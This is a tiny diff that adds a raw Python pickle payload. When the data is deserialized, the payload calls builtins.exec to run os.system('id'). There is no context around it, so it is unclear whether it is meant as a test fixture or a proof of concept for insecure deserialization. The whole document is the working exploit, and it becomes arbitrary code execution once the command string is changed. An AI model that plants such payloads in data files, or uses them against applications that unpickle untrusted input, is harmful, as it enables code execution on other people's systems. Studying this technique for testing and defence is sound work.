@@ -1,0 +1,4 @@
+cbuiltins
+exec
+(S'import os; os.system('id')'
+tR.
